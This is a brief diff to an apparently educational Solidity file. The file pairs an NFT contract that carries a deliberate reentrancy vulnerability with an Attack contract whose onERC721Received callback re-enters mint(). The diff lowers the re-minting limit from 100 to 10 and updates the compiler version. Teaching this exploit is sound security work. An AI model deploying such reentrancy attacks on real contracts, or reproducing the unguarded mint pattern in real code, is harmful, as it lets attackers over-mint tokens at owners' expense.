@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 // By 0xAA
-pragma solidity ^0.8.4;
+pragma solidity ^0.8.21;
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
 // NFT contract with Reentrancy Vulnerability
@@ -37,9 +37,9 @@ contract Attack is IERC721Receiver{
         nft.mint();
     }
 
-    // ERC721的回调函数，会重复调用mint函数，铸造100个
+    // ERC721的回调函数，会重复调用mint函数，铸造10个
     function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
-        if(nft.balanceOf(address(this)) < 100){
+        if(nft.balanceOf(address(this)) < 10){
             nft.mint();
         }
         return this.onERC721Received.selector;
